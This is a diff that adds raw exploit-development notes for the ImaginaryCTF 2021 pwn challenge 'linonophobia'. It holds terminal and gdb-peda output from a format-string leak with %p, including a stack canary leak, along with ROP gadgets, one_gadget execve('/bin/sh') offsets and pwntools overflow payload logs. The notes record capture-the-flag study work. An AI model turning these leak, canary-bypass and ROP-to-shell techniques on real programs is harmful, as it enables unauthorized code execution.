@@ -1,0 +1,117 @@
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200$ ./linonophobia 
+wElCoMe tO mY sErVeR!
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+AAAAAAAA,0x7fffffffdcc0,0x200,0x7ffff7af2151,0x15,0x7ffff7fd64c0,0x7fffffffde10,0x7ffff7ffe710,0x7ffff7a62aa0,0x404020,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x7ffff7ffea0a,(nil),(nil),(nil),0xffffffff
+����1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200$ 
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7af2151 (<__GI___libc_read+17>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x200 
+RSI: 0x0 
+RDI: 0x0 
+RBP: 0x4012f0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffddb8 --> 0x7ffff7a03bf7 (<__libc_start_main+231>:	mov    edi,eax)
+RIP: 0x4012ea (<main+324>:	ret)
+R8 : 0x10 
+R9 : 0x7ffff7fd64c0 (0x00007ffff7fd64c0)
+R10: 0x3 
+R11: 0x246 
+R12: 0x4010c0 (<_start>:	endbr64)
+R13: 0x7fffffffde90 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4012e2 <main+316>:	je     0x4012e9 <main+323>
+   0x4012e4 <main+318>:	call   0x401080 <__stack_chk_fail@plt>
+   0x4012e9 <main+323>:	leave  
+=> 0x4012ea <main+324>:	ret    
+   0x4012eb:	nop    DWORD PTR [rax+rax*1+0x0]
+   0x4012f0 <__libc_csu_init>:	endbr64 
+   0x4012f4 <__libc_csu_init+4>:	push   r15
+   0x4012f6 <__libc_csu_init+6>:	lea    r15,[rip+0x2b0b]        # 0x403e08
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddb8 --> 0x7ffff7a03bf7 (<__libc_start_main+231>:	mov    edi,eax)
+0008| 0x7fffffffddc0 --> 0x1 
+0016| 0x7fffffffddc8 --> 0x7fffffffde98 --> 0x7fffffffe1c3 ("/home/mito/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200/linonophobia")
+0024| 0x7fffffffddd0 --> 0x100008000 
+0032| 0x7fffffffddd8 --> 0x4011a6 (<main>:	endbr64)
+0040| 0x7fffffffdde0 --> 0x0 
+0048| 0x7fffffffdde8 --> 0xf51467aabcec4c76 
+0056| 0x7fffffffddf0 --> 0x4010c0 (<_start>:	endbr64)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x00000000004012ea in main ()
+gdb-peda$ x/150gx 0x7fffffffdc00
+0x7fffffffdc00:	0x000000000000000a	0x0000000000402004
+0x7fffffffdc10:	0x00007ffff7dca2a0	0x0000000000000000
+0x7fffffffdc20:	0x0000000000000000	0x00007ffff7a6f4d3
+0x7fffffffdc30:	0x0000000000000015	0x00007ffff7dce760
+0x7fffffffdc40:	0x0000000000402004	0x00007ffff7a62c42
+0x7fffffffdc50:	0x0000000000000001	0x0000000000000000
+0x7fffffffdc60:	0x0000000000000000	0x00007ffff7ffe170
+0x7fffffffdc70:	0x0000000000000001	0x00000000004012d0
+0x7fffffffdc80:	0x00007fffffffddf0	0x00007ffff7ffe710
+0x7fffffffdc90:	0x00007ffff7a62aa0	0x0000000000404020
+0x7fffffffdca0:	0x6161616161616161	0x0a31310a61616161
+0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcc0:	0x0000000000000000	0x00007ffff7ffe710
+0x7fffffffdcd0:	0x00007ffff7b95707	0x0000000000000380
+0x7fffffffdce0:	0x00007fffffffdd10	0x00007fffffffdd20
+0x7fffffffdcf0:	0x00007ffff7ffea98	0x0000000000000000
+0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd10:	0x00000000ffffffff	0x0000000000000000
+0x7fffffffdd20:	0x00007ffff7ffa268	0x00007ffff7ffe710
+0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd50:	0x000000000000000d	0x00007ffff7dd5660
+0x7fffffffdd60:	0x00007fffffffddc8	0x0000000000f0b5ff
+0x7fffffffdd70:	0x00000000000000c2	0x000000000040133d
+0x7fffffffdd80:	0x00007ffff7de3b40	0x0000000000000000
+0x7fffffffdd90:	0x00000000004012f0	0x00000000004010c0
+0x7fffffffdda0:	0x00007fffffffde90	0x2ca6fa1903a82e00
+0x7fffffffddb0:	0x00000000004012f0	0x00007ffff7a03bf7
+0x7fffffffddc0:	0x0000000000000001	0x00007fffffffde98
+0x7fffffffddd0:	0x0000000100008000	0x00000000004011a6
+
+gdb-peda$ run
+Starting program: /home/mito/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200/linonophobia 
+wElCoMe tO mY sErVeR!
+%43$p
+0x2a17d91e11160000
+
+0x0000000000401353: pop rdi; ret; 
+0x0000000000401351: pop rsi; pop r15; ret; 
+
+
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200$ one_gadget libc-2.31.so 
+0xe6c7e execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6c81 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6c84 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+[DEBUG] Sent 0x138 bytes:
+    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
+[DEBUG] Received 0x13c bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000130  41 41 41 41  41 41 41 0a  b7 06 40 0a               │AAAA│AAA·│··@·│
+    0000013c
+
+
